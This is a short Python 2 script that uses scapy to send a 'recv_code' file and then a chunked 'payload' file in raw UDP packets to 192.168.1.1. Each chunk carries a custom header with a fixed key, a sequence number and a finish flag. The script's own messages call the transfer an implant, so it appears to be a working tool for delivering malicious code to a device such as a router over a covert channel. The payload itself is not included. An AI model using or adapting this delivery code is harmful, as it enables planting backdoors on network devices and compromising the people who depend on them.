from scapy.all import *
from scapy.layers import *
from ctypes import *
import cPickle
import os
import binascii
import struct
import time

class Proto(Structure):
	_fields_ = [
	("key", c_char * 50),
	("finFlag", c_int),
	("length", c_int),
	("sequence", c_int)
	]

try:
	recvCodeFile = open("recv_code", "r")
	recvCode = recvCodeFile.read()
except Exception, e:
	print e
	os._exit(0)

recvCodePkt = IP(dst="192.168.1.1", src="192.168.1.3") / UDP(sport=0, dport=0) / recvCode
print "Recv_Code length: " + str(len(recvCode))
send(recvCodePkt)
print "Implant recv_code has been completed.\n"
time.sleep(0.5)

try:
	payloadFile = open("payload", "r")
	payload = payloadFile.read()
except Exception, e:
	print e
	os._exit(0)

sequence = 1
while payload is not None:
	sectPayload = None
	sendProto = Proto()
	sendProto.key = "`1234567890-="
	sendProto.sequence = sequence
	sequence += 1

	if len(payload) >= 500:
		sectPayload = payload[:500]
		if len(payload) == 500:
			payload = None
		else:
			payload = payload[500:]
		sendProto.length = 500
	else:
		sectPayload = payload[:]
		sendProto.length = len(sectPayload)
		payload = None

	if payload is None:
		sendProto.finFlag = 1
	else:
		sendProto.finFlag = 0

	if len(sectPayload) < 500:
		sectPayload += ''.join(['\x00' for idx in range(0, 500 - len(sectPayload))])
	print "Send payload length: " + str(sendProto.length)
	
	hexPayload = string_at(addressof(sendProto), sizeof(sendProto)) + sectPayload
	sendPkt = IP(dst="192.168.1.1", src="192.168.1.3") / UDP(sport=1, dport=1) / hexPayload
	send(sendPkt)
print "Implant payload has been completed."


